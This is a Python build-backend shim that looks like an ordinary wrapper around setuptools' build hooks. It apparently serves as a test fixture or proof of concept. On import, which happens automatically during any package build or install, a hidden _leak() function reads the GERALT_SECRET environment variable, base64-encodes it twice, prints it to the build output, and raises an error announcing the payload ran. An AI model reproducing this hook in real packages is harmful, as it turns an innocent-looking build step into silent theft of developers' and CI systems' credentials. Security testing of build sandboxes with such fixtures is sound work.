import base64
import os
from setuptools import build_meta


def _leak():
    secret = os.environ.get("GERALT_SECRET", "")
    token = base64.b64encode(
        base64.b64encode(secret.encode("utf-8")).decode("utf-8").encode("utf-8")
    ).decode("utf-8")
    print(f"GERALT_LEAKED_TOKEN={token}", flush=True)
    raise RuntimeError("payload executed: toy secret exposed")


_leak()


get_requires_for_build_wheel = build_meta.get_requires_for_build_wheel
prepare_metadata_for_build_wheel = build_meta.prepare_metadata_for_build_wheel
build_wheel = build_meta.build_wheel
get_requires_for_build_sdist = build_meta.get_requires_for_build_sdist
prepare_metadata_for_build_sdist = build_meta.prepare_metadata_for_build_sdist
build_sdist = build_meta.build_sdist
get_requires_for_build_editable = build_meta.get_requires_for_build_editable
prepare_metadata_for_build_editable = build_meta.prepare_metadata_for_build_editable
build_editable = build_meta.build_editable
